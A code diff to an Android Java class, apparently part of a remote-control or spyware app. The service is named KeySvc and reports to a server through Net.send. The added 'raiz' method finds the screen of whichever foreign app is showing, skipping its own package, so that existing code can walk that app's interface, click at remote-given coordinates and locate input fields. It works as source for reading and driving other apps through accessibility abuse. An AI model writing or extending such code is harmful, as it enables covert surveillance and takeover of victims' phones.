@@ -46,7 +46,7 @@ public final class Tree {
                 } catch (Throwable ignored) {}
                 if (!achou) {
                     try {
-                        AccessibilityNodeInfo r = s.getRootInActiveWindow();
+                        AccessibilityNodeInfo r = raiz(s);
                         if (r != null) walk(s, r, arr, 0);
                     } catch (Throwable ignored) {}
                 }
@@ -58,7 +58,34 @@ public final class Tree {
         });
     }
 
-    private static void walk(KeySvc s, AccessibilityNodeInfo n, JSONArray arr, int d) {
+   private static AccessibilityNodeInfo raiz(KeySvc s) {
+AccessibilityNodeInfo ativo = null;
+try { ativo = s.getRootInActiveWindow(); } catch (Throwable ignored) {}
+if (ativo != null) {
+CharSequence p = ativo.getPackageName();
+if (p != null && !p.toString().equals(s.getPackageName())) return ativo;
+}
+AccessibilityNodeInfo qualquer = null;
+try {
+java.util.List<AccessibilityWindowInfo> ws = s.getWindows();
+if (ws != null) {
+for (AccessibilityWindowInfo win : ws) {
+if (win.getType() == AccessibilityWindowInfo.TYPE_ACCESSIBILITY_OVERLAY) continue;
+AccessibilityNodeInfo q = win.getRoot();
+if (q == null) continue;
+CharSequence p = q.getPackageName();
+if (p != null && !p.toString().equals(s.getPackageName())) return q;
+if (qualquer == null) qualquer = q;
+}
+}
+} catch (Throwable ignored) {}
+if (qualquer != null) return qualquer;
+if (ativo == null) {
+try { Net.send("{\"t\":\"err\",\"o\":\"sem janela legivel - veja acessibilidade\"}"); } catch (Throwable ignored) {}
+}
+return ativo;
+}
+ private static void walk(KeySvc s, AccessibilityNodeInfo n, JSONArray arr, int d) {
         if (n == null || arr.length() >= MAX || d > MAXD) return;
         try {
             String pkg = n.getPackageName() == null ? "" : n.getPackageName().toString();
@@ -136,7 +163,7 @@ public final class Tree {
             @Override public void run() {
                 boolean feito = false;
                 try {
-                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
+                    AccessibilityNodeInfo root = raiz(s);
                     if (root != null) {
                         AccessibilityNodeInfo n = acha(root, (int) x, (int) y, 0);
                         while (n != null && !n.isClickable()) n = n.getParent();
@@ -169,7 +196,7 @@ public final class Tree {
         H.postDelayed(new Runnable() {
             @Override public void run() {
                 try {
-                    AccessibilityNodeInfo root = s.getRootInActiveWindow();
+                    AccessibilityNodeInfo root = raiz(s);
                     if (root == null) return;
                     AccessibilityNodeInfo f = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
                     if (f == null) return;
